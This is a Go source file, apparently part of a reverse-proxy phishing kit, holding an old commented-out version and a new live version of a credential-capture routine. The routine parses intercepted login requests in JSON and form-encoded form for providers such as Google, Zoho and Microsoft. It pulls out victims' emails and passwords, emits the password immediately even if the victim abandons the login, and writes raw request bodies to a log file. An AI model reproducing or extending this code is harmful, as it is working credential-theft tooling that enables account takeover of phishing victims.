// package main

// import (
// 	"fmt"
// 	"net/url"
// 	"regexp"
// 	"strings"
// 	"time"
// )

// // ══════════════════════════════════════════════════════════
// //  CREDENTIAL CAPTURE
// //  Extracts credentials from POST bodies using target-specific
// //  regex patterns. Stores them on the session and logs to file.
// // ══════════════════════════════════════════════════════════

// // emailRe matches a bare email address (used to pull usernames out of URL
// // paths for providers like Zoho that send the email in the path, not the body).
// var emailRe = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)

// func captureCredentials(source, body string, target *Target, session *Session) {
// 	var captured []string
// 	var capturedUser, capturedPass string

// 	for _, re := range target.CredPatterns {
// 		matches := re.FindAllStringSubmatch(body, -1)
// 		for _, match := range matches {
// 			if len(match) > 1 {
// 				// Decoded full match for readable terminal/log output
// 				captured = append(captured, tryDecode(match[0]))

// 				lower := strings.ToLower(match[0])
// 				// Decode the value (user%40gmail.com → user@gmail.com)
// 				// BEFORE the "@" check, or Google usernames never store.
// 				value := tryDecode(match[1])

// 				// Detect username/email fields
// 				if strings.Contains(lower, "username") ||
// 					strings.Contains(lower, "login") ||
// 					strings.Contains(lower, "email") ||
// 					strings.Contains(lower, "user") {
// 					// Only treat as a username if it looks like an email (contains @)
// 					if strings.Contains(value, "@") {
// 						capturedUser = value
// 					}
// 				}

// 				// Detect password fields
// 				if strings.Contains(lower, "pass") ||
// 					strings.Contains(lower, "passwd") ||
// 					strings.Contains(lower, "pwd") {
// 					capturedPass = value
// 				}
// 			}
// 		}
// 	}

// 	// ── Store on session (thread-safe — the DOM-capture handler may write
// 	//    concurrently from a different goroutine) ──
// 	if session != nil {
// 		session.SetCredentials(capturedUser, capturedPass)

// 		// ── Fallback: some providers (e.g. Zoho) send the email in the URL path
// 		//    (/signin/v2/lookup/user@domain.com) rather than the POST body. If the
// 		//    body patterns didn't yield a username, pull an email out of the source
// 		//    (host+path) so the session username still gets populated. ──
// 		currentUser, _, _, _, _ := session.Snapshot()
// 		if currentUser == "" {
// 			if email := extractEmail(source); email != "" {
// 				session.SetCredentials(email, "")
// 			}
// 		}

// 		// ── EVENT 1 — emit the password immediately so the credential is recorded
// 		//    even if the victim abandons the login. Gated on capturedPass != "" so
// 		//    a username-only body never consumes the one-shot gate (which would
// 		//    suppress the DOM hook's later password capture). ShouldEmitPassword
// 		//    dedupes against the DOM path — whichever lands first fires Event 1. ──
// 		if capturedPass != "" && session.ShouldEmitPassword(capturedPass) {
// 			emitCapture(session, target)
// 		}
// 	}

// 	if len(captured) == 0 {
// 		return
// 	}

// 	// ── Print to terminal ──
// 	fmt.Println()
// 	fmt.Println("┌──────────────────────────────────────────────────────")
// 	fmt.Printf("│ [!!!] CREDENTIAL INTERCEPTED [%s]\n", target.Name)
// 	fmt.Printf("│ Source: %s\n", source)
// 	fmt.Printf("│ Time:   %s\n", time.Now().Format(time.RFC3339))
// 	for _, c := range captured {
// 		fmt.Printf("│ Match:  %s\n", c)
// 	}
// 	fmt.Println("└──────────────────────────────────────────────────────")
// 	fmt.Println()

// 	// ── Write to log file (mutex-guarded; FULL BODY stays raw — forensic evidence) ──
// 	entry := fmt.Sprintf("[%s] [%s] SOURCE: %s\n",
// 		time.Now().Format(time.RFC3339), target.Name, source)
// 	for _, c := range captured {
// 		entry += fmt.Sprintf("  MATCH: %s\n", c)
// 	}
// 	entry += fmt.Sprintf("  FULL BODY: %s\n\n", body)
// 	appendToFile(credLogFile, entry)
// }

// // extractEmail returns the first email address found in s (typically a request
// // host+path), percent-decoded. Returns "" if none is present.
// func extractEmail(s string) string {
// 	if m := emailRe.FindString(s); m != "" {
// 		return tryDecode(m)
// 	}
// 	return ""
// }

// // tryDecode percent-decodes a captured value (user%40gmail.com → user@gmail.com).
// // It only attempts decoding when a '%' is present and falls back to the original
// // on error, so plain JSON values (Turbify/Microsoft) are left untouched and a
// // literal '+' in a password is preserved unless real percent-encoding exists.
// func tryDecode(s string) string {
// 	if !strings.Contains(s, "%") {
// 		return s
// 	}
// 	if d, err := url.QueryUnescape(s); err == nil {
// 		return d
// 	}
// 	return s
// }

package main

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// ══════════════════════════════════════════════════════════
//  CREDENTIAL CAPTURE (v2.0 - JSON NATIVE)
//  Extracts credentials from POST bodies. Natively parses
//  application/json for modern SPAs, falls back to regex
//  for legacy form-urlencoded payloads.
// ══════════════════════════════════════════════════════════

// emailRe matches a bare email address (used to pull usernames out of URL
// paths for providers like Zoho that send the email in the path, not the body).
var emailRe = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)

// isUserKey checks if a JSON key likely represents a username/email.
func isUserKey(k string) bool {
	k = strings.ToLower(k)
	return strings.Contains(k, "username") || strings.Contains(k, "login") ||
		strings.Contains(k, "email") || strings.Contains(k, "user") ||
		strings.Contains(k, "uid") || strings.Contains(k, "identifier") ||
		strings.Contains(k, "account")
}

// isPassKey checks if a JSON key likely represents a password.
func isPassKey(k string) bool {
	k = strings.ToLower(k)
	return strings.Contains(k, "pass") || strings.Contains(k, "passwd") ||
		strings.Contains(k, "pwd") || strings.Contains(k, "secret") ||
		strings.Contains(k, "credential")
}

// extractFromJSON recursively searches a parsed JSON object for credentials.
// Modern SPAs often nest payloads, so we don't just look at the top level.
func extractFromJSON(data map[string]interface{}) (string, string) {
	var user, pass string
	for k, v := range data {
		switch val := v.(type) {
		case string:
			if user == "" && isUserKey(k) && strings.Contains(val, "@") {
				user = val
			}
			if pass == "" && isPassKey(k) && val != "" {
				pass = val
			}
		case map[string]interface{}:
			// Recurse into nested objects
			if u, p := extractFromJSON(val); u != "" || p != "" {
				if user == "" {
					user = u
				}
				if pass == "" {
					pass = p
				}
			}
		}
	}
	return user, pass
}

// captureCredentials intercepts the body, parses it based on Content-Type,
// and extracts the username and password.
// NOTE: We added 'contentType string' to the signature!
func captureCredentials(source, body, contentType string, target *Target, session *Session) {
	var captured []string
	var capturedUser, capturedPass string

	// ── 1. NATIVE JSON INGESTION (The Modern Web) ──
	if strings.Contains(strings.ToLower(contentType), "application/json") {
		var jsonData map[string]interface{}
		if err := json.Unmarshal([]byte(body), &jsonData); err == nil {
			capturedUser, capturedPass = extractFromJSON(jsonData)
			if capturedUser != "" {
				captured = append(captured, fmt.Sprintf("json_username: %s", capturedUser))
			}
			if capturedPass != "" {
				captured = append(captured, fmt.Sprintf("json_password: %s", capturedPass))
			}
		}
	}

	// ── 2. REGEX FALLBACK (Form-UrlEncoded or malformed JSON) ──
	if len(captured) == 0 {
		for _, re := range target.CredPatterns {
			matches := re.FindAllStringSubmatch(body, -1)
			for _, match := range matches {
				if len(match) > 1 {
					captured = append(captured, tryDecode(match[0]))
					lower := strings.ToLower(match[0])
					value := tryDecode(match[1])

					if isUserKey(lower) && strings.Contains(value, "@") {
						capturedUser = value
					}
					if isPassKey(lower) {
						capturedPass = value
					}
				}
			}
		}
	}

	// ── Store on session (thread-safe) ──
	if session != nil {
		session.SetCredentials(capturedUser, capturedPass)

		// ── Fallback: Zoho path extraction ──
		currentUser, _, _, _, _ := session.Snapshot()
		if currentUser == "" {
			if email := extractEmail(source); email != "" {
				session.SetCredentials(email, "")
			}
		}

		// ── EVENT 1 — emit the password immediately ──
		if capturedPass != "" && session.ShouldEmitPassword(capturedPass) {
			emitCapture(session, target)
		}
	}

	if len(captured) == 0 {
		return
	}

	// ── Print to terminal ──
	fmt.Println()
	fmt.Println("┌──────────────────────────────────────────────────────")
	fmt.Printf("│ [!!!] CREDENTIAL INTERCEPTED [%s]\n", target.Name)
	fmt.Printf("│ Source: %s\n", source)
	fmt.Printf("│ Time:   %s\n", time.Now().Format(time.RFC3339))
	for _, c := range captured {
		fmt.Printf("│ Match:  %s\n", c)
	}
	fmt.Println("└──────────────────────────────────────────────────────")
	fmt.Println()

	// ── Write to log file (with size cap to prevent log bloat) ──
	rawBody := body
	if len(rawBody) > 4096 { // 4KB limit for raw forensic logs
		rawBody = rawBody[:4096] + "\n... [TRUNCATED: Original size " + fmt.Sprintf("%d", len(body)) + " bytes] ..."
	}

	entry := fmt.Sprintf("[%s] [%s] SOURCE: %s\n",
		time.Now().Format(time.RFC3339), target.Name, source)
	for _, c := range captured {
		entry += fmt.Sprintf("  MATCH: %s\n", c)
	}
	entry += fmt.Sprintf("  FULL BODY: %s\n\n", rawBody)
	appendToFile(credLogFile, entry)
}

// extractEmail returns the first email address found in s.
func extractEmail(s string) string {
	if m := emailRe.FindString(s); m != "" {
		return tryDecode(m)
	}
	return ""
}

// tryDecode percent-decodes a captured value safely.
func tryDecode(s string) string {
	if !strings.Contains(s, "%") {
		return s
	}
	if d, err := url.QueryUnescape(s); err == nil {
		return d
	}
	return s
}
